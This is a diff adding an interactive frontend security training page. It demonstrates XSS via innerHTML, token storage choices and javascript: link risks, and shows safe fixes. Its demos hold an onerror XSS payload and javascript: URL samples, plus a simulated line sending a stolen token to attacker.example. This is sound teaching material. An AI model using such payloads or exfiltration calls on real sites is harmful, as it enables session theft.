@@ -1,0 +1,365 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Security · Senior Frontend Lab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500..700&family=JetBrains+Mono:wght@400;500;600&family=Source+Sans+3:wght@400;600;700&display=swap">
+<link rel="stylesheet" href="../lab.css">
+<style>
+  .comment { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 12px 14px; display: grid; gap: 4px; min-height: 64px; }
+  .comment-author { font: 600 13px var(--f-mono); color: var(--muted); }
+  .comment-body { overflow-wrap: anywhere; }
+  .comment-body img { max-width: 40px; }
+  .dom-view { margin: 0; font: 12px/1.5 var(--f-mono); color: var(--muted); overflow-wrap: anywhere; white-space: pre-wrap; }
+  .presets { display: flex; flex-wrap: wrap; gap: 6px; }
+  .attack-out { font: 12.5px/1.55 var(--f-mono); background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 10px 12px; white-space: pre-wrap; overflow-wrap: anywhere; margin: 0; min-height: 60px; }
+  .checks { display: grid; gap: 8px; }
+  .check-row { display: flex; justify-content: space-between; align-items: center; gap: 10px; flex-wrap: wrap; padding: 8px 10px; background: var(--surface); border: 1px solid var(--line); border-radius: 8px; font-size: 14px; }
+</style>
+</head>
+<body data-module="seguranca">
+<header class="topbar"><div class="wrap"><a class="brand" href="index.html"><span class="brand-mark">FS</span>Senior Frontend Lab</a><nav class="modnav" id="modnav" aria-label="Modules"></nav></div></header>
+
+<div class="wrap">
+  <header class="page-head">
+    <p class="eyebrow">Module · Security</p>
+    <h1>Any data from outside is suspect</h1>
+    <p class="lede">On the frontend, most attacks come in one way: user text being treated as code. Here you inject a real script, see what it can steal, and decide where to store authentication.</p>
+    <ul class="senior">
+      <li><b>Never trusts input</b>Comments, URL parameters and API responses are data, never HTML.</li>
+      <li><b>Thinks like an attacker</b>Asks what an injected script could read and do.</li>
+      <li><b>Uses layers</b>Escaping, sanitizing, CSP and httpOnly cookies: each layer covers another's gap.</li>
+    </ul>
+  </header>
+
+  <main>
+    <section class="lab" id="xss">
+      <div class="lab-head">
+        <p class="eyebrow">Experiment · XSS</p>
+        <h2>Post a malicious comment</h2>
+        <p>A customer comment is shown on screen. Pick the content and how it is rendered. With <code>innerHTML</code>, the browser parses the text as HTML, and an <code>onerror</code> attribute becomes executed code.</p>
+      </div>
+      <div class="playground">
+        <div class="controls">
+          <div class="field">
+            <span class="field-label">Examples</span>
+            <div class="presets">
+              <button type="button" class="btn small" data-preset="normal">Plain text</button>
+              <button type="button" class="btn small" data-preset="bold">With bold</button>
+              <button type="button" class="btn small" data-preset="attack">Attack</button>
+            </div>
+          </div>
+          <div class="field">
+            <label for="xss-input">Submitted comment</label>
+            <textarea id="xss-input" spellcheck="false"></textarea>
+          </div>
+          <div class="field">
+            <span class="field-label">How the page renders it</span>
+            <div class="seg" role="radiogroup" aria-label="Rendering method">
+              <label><input type="radio" name="xss-mode" value="inner" checked><span>innerHTML</span></label>
+              <label><input type="radio" name="xss-mode" value="text"><span>textContent</span></label>
+              <label><input type="radio" name="xss-mode" value="sanit"><span>Sanitized</span></label>
+            </div>
+          </div>
+          <button type="button" class="btn primary" id="xss-run" style="justify-self:start">Post comment</button>
+        </div>
+        <div class="output">
+          <div class="comment">
+            <span class="comment-author">joao.produtor · just now</span>
+            <div class="comment-body" id="xss-out"></div>
+          </div>
+          <div class="banner bad" id="xss-alarm" hidden><b>The script ran in the victim's browser.</b><span id="xss-alarm-detail"></span></div>
+          <div class="banner warn" id="xss-csp" hidden><b>The handler was blocked by this environment's CSP.</b>Without a Content Security Policy, it would have run. CSP is your second line of defense, not the first.</div>
+          <div class="banner good" id="xss-safe" hidden><b>Nothing executed.</b><span id="xss-safe-detail"></span></div>
+          <div>
+            <p class="code-label">The DOM the browser built</p>
+            <p class="dom-view" id="xss-dom"></p>
+          </div>
+        </div>
+      </div>
+      <div class="code-pair">
+        <div><p class="code-label">Vulnerable</p>
+<pre class="code">el.innerHTML = comment                   <span class="no">// parses HTML</span>
+
+&lt;div dangerouslySetInnerHTML={{ __html: comment }} /&gt;  <span class="no">// React: the name warns you</span></pre></div>
+        <div><p class="code-label">Safe</p>
+<pre class="code">el.textContent = comment                 <span class="ok">// always text</span>
+
+&lt;p&gt;{comment}&lt;/p&gt;                        <span class="ok">// React escapes by default</span>
+
+<span class="c">// Need to allow bold? Sanitize with an allowlist:</span>
+DOMPurify.sanitize(html, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong'] })</pre></div>
+      </div>
+      <p class="takeaway"><b>Senior take.</b> React already protects you by default. The risk shows up when someone uses <code>dangerouslySetInnerHTML</code>, inserts HTML from a rich text editor, or builds an <code>href</code> from user data. In code review, look for these three things first.</p>
+    </section>
+
+    <section class="lab" id="token">
+      <div class="lab-head">
+        <p class="eyebrow">Experiment · Token storage</p>
+        <h2>What can an injected script take?</h2>
+        <p>Choose where the app stores the access token and run an attacker script. It performs the same reads a real XSS would.</p>
+      </div>
+      <div class="playground">
+        <div class="controls">
+          <div class="field">
+            <span class="field-label">Where the token lives</span>
+            <div class="seg" role="radiogroup" aria-label="Token location">
+              <label><input type="radio" name="tk" value="local" checked><span>localStorage</span></label>
+              <label><input type="radio" name="tk" value="session"><span>sessionStorage</span></label>
+              <label><input type="radio" name="tk" value="memory"><span>Memory</span></label>
+              <label><input type="radio" name="tk" value="cookie"><span>httpOnly cookie</span></label>
+            </div>
+          </div>
+          <button type="button" class="btn primary" id="tk-attack" style="justify-self:start">Run attacker script</button>
+          <pre class="attack-out" id="tk-out" aria-live="polite">The attack result shows up here.</pre>
+        </div>
+        <div class="output">
+          <div class="checks" id="tk-checks"></div>
+        </div>
+      </div>
+      <p class="takeaway"><b>Senior take.</b> No option makes an XSS harmless: even without reading the token, the script can make requests on the user's behalf while the tab is open. An httpOnly cookie prevents token <i>theft</i>, which is what lets the attack continue after the tab closes.</p>
+    </section>
+
+    <section class="lab" id="url">
+      <div class="lab-head">
+        <p class="eyebrow">Experiment · Links with user data</p>
+        <h2>Is this link safe?</h2>
+        <p>A profile lets the user enter their own website. If you put that value straight into the <code>href</code>, a <code>javascript:</code> URL runs when someone clicks it. Compare the naive check with the URL parser check.</p>
+      </div>
+      <div class="playground">
+        <div class="controls">
+          <div class="field">
+            <span class="field-label">Examples</span>
+            <div class="presets">
+              <button type="button" class="btn small" data-url="https://fazendaboavista.com.br">Normal site</button>
+              <button type="button" class="btn small" data-url="/clients/42">Relative path</button>
+              <button type="button" class="btn small" data-url="javascript:steal()">javascript:</button>
+              <button type="button" class="btn small" data-url="  JaVaScRiPt:steal()">Mixed case and spaces</button>
+              <button type="button" class="btn small" data-url="java&#9;script:steal()">With a tab</button>
+            </div>
+          </div>
+          <div class="field">
+            <label for="url-input">Website entered by the user</label>
+            <input id="url-input" type="text" spellcheck="false" autocomplete="off">
+          </div>
+        </div>
+        <div class="output">
+          <div class="checks">
+            <div class="check-row"><span>Naive check: <code>!url.startsWith('javascript:')</code></span><span id="url-naive"></span></div>
+            <div class="check-row"><span>Parser + allowlist: <code>new URL(url).protocol</code></span><span id="url-safe"></span></div>
+          </div>
+          <p class="hint" id="url-proto"></p>
+          <p style="margin:0">How it renders: <span id="url-render"></span></p>
+        </div>
+      </div>
+      <details class="src">
+        <summary>See the code</summary>
+<pre class="code">const ALLOWED_PROTOCOLS = ['http:', 'https:', 'mailto:']
+
+function safeHref(value) {
+  try {
+    const url = new URL(value, window.location.origin)  <span class="c">// normalizes like the browser does</span>
+    return ALLOWED_PROTOCOLS.includes(url.protocol) ? url.href : null
+  } catch {
+    return null
+  }
+}
+
+<span class="c">// an allowlist (what is allowed) is safer than a blocklist (what is not)</span></pre>
+      </details>
+      <p class="takeaway"><b>Senior take.</b> Validate on the frontend for a good experience, but the rule that protects you lives on the backend. Anyone with DevTools open can bypass the frontend.</p>
+    </section>
+
+    <section id="decidir"></section>
+  </main>
+
+  <nav class="pager" id="pager" aria-label="Module navigation"></nav>
+</div>
+
+<script src="../lab.js"></script>
+<script>
+const { $, $$, esc } = Lab;
+const FAKE_TOKEN = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbmEiLCJyb2xlIjoiYWRtaW4ifQ.lab-demo';
+try { localStorage.setItem('access_token', FAKE_TOKEN); } catch (e) {}
+
+/* XSS */
+let xssHitFlag = false;
+window.xssHit = function () {
+  xssHitFlag = true;
+  let tok = null;
+  try { tok = localStorage.getItem('access_token'); } catch (e) {}
+  $('#xss-alarm').hidden = false;
+  $('#xss-csp').hidden = true;
+  $('#xss-alarm-detail').textContent = tok
+    ? ` It read the token from localStorage (${tok.slice(0, 22)}…) and could send it to another server with a fetch.`
+    : ' It can access everything the page can.';
+};
+(() => {
+  const PRESETS = {
+    normal: 'Delivery arrived on time, recommended.',
+    bold: '<b>Really</b> fast delivery, recommended.',
+    attack: 'Great service! <img src="x" onerror="xssHit()">',
+  };
+  const input = $('#xss-input'), out = $('#xss-out');
+  const ALLOWED = new Set(['B', 'STRONG', 'I', 'EM', 'BR']);
+
+  function sanitize(html) {
+    const tpl = document.createElement('template'); // template content is inert: nothing loads or runs
+    tpl.innerHTML = html;
+    const clean = (node) => {
+      for (const child of [...node.childNodes]) {
+        if (child.nodeType === 1) {
+          if (ALLOWED.has(child.tagName)) {
+            [...child.attributes].forEach((a) => child.removeAttribute(a.name));
+            clean(child);
+          } else {
+            child.replaceWith(document.createTextNode(child.outerHTML));
+          }
+        } else if (child.nodeType !== 3) child.remove();
+      }
+    };
+    clean(tpl.content);
+    return tpl.content;
+  }
+
+  function publish() {
+    const value = input.value;
+    const mode = $('input[name=xss-mode]:checked').value;
+    xssHitFlag = false;
+    $('#xss-alarm').hidden = $('#xss-csp').hidden = $('#xss-safe').hidden = true;
+    if (mode === 'inner') out.innerHTML = value;
+    else if (mode === 'text') out.textContent = value;
+    else out.replaceChildren(sanitize(value));
+    $('#xss-dom').textContent = out.innerHTML || '(empty)';
+    const dangerous = /on\w+\s*=|<script/i.test(value);
+    setTimeout(() => {
+      if (xssHitFlag || !dangerous) return;
+      if (mode === 'inner') { $('#xss-csp').hidden = false; return; }
+      $('#xss-safe').hidden = false;
+      $('#xss-safe-detail').textContent = mode === 'text'
+        ? ' textContent treated everything as text: the tags show up as characters.'
+        : ' The allowlist kept only the allowed tags, with no attributes. The <img> became text.';
+    }, 700);
+  }
+
+  $$('[data-preset]').forEach((b) => b.addEventListener('click', () => { input.value = PRESETS[b.dataset.preset]; publish(); }));
+  $('#xss-run').addEventListener('click', publish);
+  $$('input[name=xss-mode]').forEach((r) => r.addEventListener('change', publish));
+  input.value = PRESETS.bold;
+  publish();
+})();
+
+/* Token */
+(() => {
+  const DATA = {
+    local: [
+      ['Injected script can read it', 'Yes', 'bad'],
+      ['Survives a page reload', 'Yes', 'good'],
+      ['Browser sends it automatically (CSRF risk)', 'No', 'good'],
+      ['Shared across tabs', 'Yes', 'good'],
+    ],
+    session: [
+      ['Injected script can read it', 'Yes', 'bad'],
+      ['Survives a page reload', 'Same tab only', 'warn'],
+      ['Browser sends it automatically (CSRF risk)', 'No', 'good'],
+      ['Shared across tabs', 'No', 'warn'],
+    ],
+    memory: [
+      ['Injected script can read it', 'Hard, but it can use the session', 'warn'],
+      ['Survives a page reload', 'No, needs a refresh', 'warn'],
+      ['Browser sends it automatically (CSRF risk)', 'No', 'good'],
+      ['Shared across tabs', 'No', 'warn'],
+    ],
+    cookie: [
+      ['Injected script can read it', 'No', 'good'],
+      ['Survives a page reload', 'Yes', 'good'],
+      ['Browser sends it automatically (CSRF risk)', 'Yes, requires SameSite', 'warn'],
+      ['Shared across tabs', 'Yes', 'good'],
+    ],
+  };
+  const mode = () => $('input[name=tk]:checked').value;
+  function renderChecks() {
+    $('#tk-checks').innerHTML = DATA[mode()].map(([k, v, tone]) =>
+      `<div class="check-row"><span>${k}</span><span class="pill ${tone}">${v}</span></div>`).join('');
+    $('#tk-out').textContent = 'The attack result shows up here.';
+  }
+  function attack() {
+    const m = mode();
+    const lines = [];
+    if (m === 'local' || m === 'session') {
+      const st = m === 'local' ? localStorage : sessionStorage;
+      try { st.setItem('access_token', FAKE_TOKEN); } catch (e) {}
+      let got = null;
+      try { got = st.getItem('access_token'); } catch (e) {}
+      lines.push(`> ${m}Storage.getItem('access_token')`, `"${got}"`, '', `> fetch('https://attacker.example/steal?t=' + token)`, 'Token sent. The attacker uses the victim\'s account from another computer.');
+    } else if (m === 'memory') {
+      lines.push("> window.accessToken", 'undefined   (the token lives inside a module, with no global reference)', '', "> fetch('/api/contracts', { method: 'DELETE' })", 'If your HTTP client attaches the token automatically, the script still acts as the victim while the tab is open.');
+    } else {
+      lines.push('> document.cookie', JSON.stringify(document.cookie || ''), '(httpOnly cookies do not show up here)', '', 'The token cannot be taken out. The script can still make requests through the page, but the attack ends when the tab closes.');
+    }
+    $('#tk-out').textContent = lines.join('\n');
+  }
+  $$('input[name=tk]').forEach((r) => r.addEventListener('change', renderChecks));
+  $('#tk-attack').addEventListener('click', attack);
+  renderChecks();
+})();
+
+/* URL */
+(() => {
+  const input = $('#url-input');
+  const OK = ['http:', 'https:', 'mailto:'];
+  function check() {
+    const raw = input.value;
+    const naiveOk = !raw.startsWith('javascript:');
+    let proto = 'invalid', href = null;
+    try { const u = new URL(raw, 'https://app.example.com'); proto = u.protocol; if (OK.includes(u.protocol)) href = u.href; } catch (e) {}
+    const safeOk = !!href;
+    const reallyDangerous = proto === 'javascript:' || proto === 'data:';
+    $('#url-naive').innerHTML = naiveOk
+      ? (reallyDangerous ? '<span class="pill bad">Approved an attack</span>' : '<span class="pill good">Approved</span>')
+      : '<span class="pill good">Blocked</span>';
+    $('#url-safe').innerHTML = safeOk ? '<span class="pill good">Approved</span>' : '<span class="pill good">Blocked</span>';
+    $('#url-proto').innerHTML = `The browser reads the protocol as <code>${esc(proto)}</code>${raw !== raw.trim() || /\t/.test(raw) ? ', after stripping spaces and tabs' : ''}.`;
+    $('#url-render').innerHTML = safeOk
+      ? `<a href="${esc(href)}" target="_blank" rel="noopener noreferrer">${esc(raw)}</a>`
+      : `<span class="pill neutral">link removed</span>`;
+  }
+  $$('[data-url]').forEach((b) => b.addEventListener('click', () => { input.value = b.dataset.url; check(); }));
+  input.addEventListener('input', check);
+  input.value = '  JaVaScRiPt:steal()';
+  check();
+})();
+
+/* Decision */
+Lab.decision($('#decidir'), {
+  title: 'Where do I store authentication?',
+  intro: 'The answer depends on who controls the backend and where it lives. Answer with your current system in mind.',
+  questions: [
+    { id: 'xss', text: 'Does the app already defend against XSS?', hint: 'No dangerouslySetInnerHTML with user data, CSP configured, dependencies audited.',
+      options: [{ v: 'sim', label: 'Yes' }, { v: 'nao', label: 'Not sure / no' }] },
+    { id: 'dono', text: 'Who issues the token?',
+      options: [{ v: 'nos', label: 'Our own API' }, { v: 'terceiro', label: 'A provider (Auth0, Firebase, Cognito)' }] },
+    { id: 'site', text: 'Are the frontend and the API on the same site?', hint: 'app.company.com and api.company.com count as the same site.', when: (a) => a.dono === 'nos',
+      options: [{ v: 'sim', label: 'Yes, same domain' }, { v: 'nao', label: 'No, different domains' }] },
+  ],
+  decide(a) {
+    const xssNote = a.xss === 'nao'
+      ? '<p><b>First things first:</b> without XSS defenses, no storage choice protects you. Start with a CSP and a search for <code>dangerouslySetInnerHTML</code> in the codebase.</p>' : '';
+    if (a.dono === 'nos' && a.site === 'sim') return {
+      tone: a.xss === 'nao' ? 'warn' : 'good', title: 'httpOnly cookie issued by the API',
+      body: xssNote + '<p>JavaScript cannot read the token, and the browser sends the cookie on its own. Add:</p><ul><li><code>Secure</code> and <code>SameSite=Lax</code> (or <code>Strict</code>)</li><li>an anti-CSRF token on requests that change data</li><li>short expiry and server-side renewal</li></ul>',
+      code: 'Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600' };
+    if (a.dono === 'nos') return {
+      tone: 'warn', title: 'Put a BFF on the same domain as the frontend',
+      body: xssNote + '<p>With different domains, many browsers block third-party cookies. A <i>backend for frontend</i> (a Next.js route or a proxy) on the app\'s domain keeps the session in an httpOnly cookie and forwards calls to the API.</p>' };
+    return {
+      tone: 'warn', title: 'Access token in memory, renewed by the SDK',
+      body: xssNote + '<p>Let the provider\'s SDK keep a short-lived access token (5 to 15 min) in memory and renew it with <i>refresh token rotation</i>. Avoid copying the token to localStorage just to survive a reload.</p>' };
+  },
+});
+</script>
+</body>
+</html>
